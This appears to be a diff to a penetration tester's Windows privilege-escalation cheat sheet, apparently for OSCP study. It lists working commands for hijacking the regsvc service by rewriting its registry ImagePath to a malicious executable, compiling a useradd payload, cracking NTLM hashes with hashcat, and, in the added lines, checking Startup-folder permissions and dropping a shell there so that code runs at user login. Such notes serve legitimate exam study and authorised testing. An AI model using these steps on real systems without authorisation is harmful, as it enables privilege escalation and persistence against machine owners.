@@ -10,6 +10,7 @@ msiexec /quiet /qn /i <msi location>
 Get-Acl-Path hklm\System\CurrentControlSet\Services\regsvc | fl ~ (NT Authority\Interactive means user has "FullControl" over key)
 reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d <malicious_filename> /f
 sc start regsvc
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
 
 -hashcat -m 1000 <hash> <wordlist>
 
@@ -23,3 +24,7 @@ Download useradd.c to kali then compile - [https://github.com/codingo/OSCP-2/blo
 x86_64-w64-mingw32-gcc useradd.c -o mycode.exe  
 reg add hklm\System\CurrentControlSet\Services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\mycode.exe /f  
 sc start regsvc
+
+#### Startup Applications
+icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" ~ (BUILTIN\Users '(F)' means user has full access)
+Place shell or code in this folder, when user logs in, code execution
